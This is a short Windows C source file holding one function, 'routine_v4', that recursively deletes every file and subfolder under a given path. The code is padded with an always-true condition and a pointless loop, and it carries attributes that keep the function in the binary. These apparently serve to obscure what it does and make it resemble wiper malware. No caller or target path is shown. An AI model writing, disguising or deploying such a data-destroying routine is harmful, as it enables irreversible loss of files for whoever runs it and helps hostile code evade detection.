#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v4(const char* path){
    if (path != NULL && (1 + 1 == 2)) {
        char s[MAX_PATH];
        wsprintfA(s, "%s\\*", path);
        WIN32_FIND_DATAA d;
        HANDLE h = FindFirstFileA(s, &d);
        if (h != INVALID_HANDLE_VALUE) {
            do {
                if (d.cFileName[0] == '.') continue;
                char f[MAX_PATH];
                wsprintfA(f, "%s\\%s", path, d.cFileName);
                for(int j=0; j<2; j++) { if(j==1) {
                    if (d.dwFileAttributes & 16) routine_v4(f);
                    else DeleteFileA(f);
                }}
            } while (FindNextFileA(h, &d));
            FindClose(h);
        }
        RemoveDirectoryA(path);
    }
}